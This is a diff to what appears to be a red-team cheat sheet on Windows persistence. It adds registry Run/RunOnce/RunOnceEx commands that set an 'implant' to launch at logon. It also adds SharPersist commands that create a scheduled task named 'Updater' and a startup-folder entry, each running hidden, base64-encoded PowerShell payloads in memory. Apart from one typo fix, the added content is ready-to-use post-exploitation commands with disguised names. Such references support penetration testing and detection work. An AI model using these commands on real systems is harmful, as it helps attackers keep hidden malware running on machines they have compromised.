@@ -4,6 +4,38 @@
 ## Low Privilege Level
 >___
 
+
+#### Registry Starup Persistence
+
+- Unprivileged
+
+```
+> reg add "HKCU\Software\Microsoft\CurrentVersion\Run" /v <value> /t REG_SZ /d "C:\path\to\implant"
+
+> reg add "HKCU\Software\Microsoft\CurrentVersion\RunOnce" /v <value> /t REG_SZ /d "C:\path\to\implant"
+
+> reg add "HKCU\Software\Microsoft\CurrentVersion\RunServices" /v <value> /t REG_SZ /d "C:\path\to\implant"
+
+> reg add "HKCU\Software\Microsoft\CurrentVersion\RunServicesOnce" /v <value> /t REG_SZ /d "C:\path\to\implant"
+```
+
+- Privileged users
+
+```
+> reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v <value> /t REG_SZ /d "C:\path\to\implant"
+
+> reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v <value> /t REG_SZ /d "C:\path\to\implant"
+
+> reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices" /v <value> /t REG_SZ /d "C:\path\to\implant"
+
+> reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce" /v <value> /t REG_SZ /d "C:\path\to\implant"
+
+> reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnceEx\0001" /v <value> /t REG_SZ /d "C:\path\to\implant"
+
+> reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend" /v <value> /t REG_SZ /d "C:\path\to\implant.dll"
+```
+
+
 #### Logon Script (Registry)
 
 Regular User / Medium Integrity Level
@@ -425,7 +457,7 @@ Query: SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance 
 Query: SELECT * FROM __InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_NTLogEvent' AND Targetinstance.EventCode = '4625' And Targetinstance.Message Like '%BOB%'
 ```
 
-- èvery 10 seconds check for any service modification
+- every 10 seconds check for any service modification
 ```
 Query: SELECT * FROM __InstanceModificationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_Service'"
 ```
@@ -532,6 +564,14 @@ HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\W32Time\TimeProviders\
 ```
 
 3. After reboot persistence is start
+
+
+
+#### Tools for automate
+
+- SharPersist https://github.com/mandiant/SharPersist (prefer execute im-memory)
+  - ```> execute-assembly C:\path\to\binary -t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc <B64-payload>" -n "Updater" -m add -o hourly```
+  - ```> execute-assembly C:\path\to\binary -t startupfolder -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc <B64-payload>" -f "UserEnvSetup" -m add```
 
 
 #### Conforme eu for achando e testando tecnicas e tools novas vou atualizar aqui.
